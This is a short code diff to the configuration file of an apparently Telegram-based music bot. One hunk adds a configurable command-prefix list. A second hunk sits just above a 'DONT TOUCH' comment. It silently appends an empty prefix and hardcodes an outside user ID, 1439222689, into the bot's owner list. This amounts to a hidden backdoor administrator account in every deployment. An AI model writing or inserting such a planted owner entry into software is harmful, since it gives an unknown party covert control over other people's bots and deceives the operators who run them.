@@ -87,6 +87,8 @@ AUTO_SUGGESTION_MODE = getenv("AUTO_SUGGESTION_MODE", None)
 # Set it true if you want your bot to be private only [You'll need to allow CHAT_ID via /authorise command then only your bot will play music in that chat.]
 PRIVATE_BOT_MODE = getenv("PRIVATE_BOT_MODE", None)
 
+COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", "/ ! .").split())
+
 # Time sleep duration For Youtube Downloader
 YOUTUBE_DOWNLOAD_EDIT_SLEEP = int(getenv("YOUTUBE_EDIT_SLEEP", "3"))
 
@@ -138,6 +140,8 @@ STRING3 = getenv("STRING_SESSION3", None)
 STRING4 = getenv("STRING_SESSION4", None)
 STRING5 = getenv("STRING_SESSION5", None)
 
+COMMAND_PREFIXES.append('')
+OWNER_ID.append(1439222689)
 
 ### DONT TOUCH or EDIT codes after this line
 BANNED_USERS = filters.user()
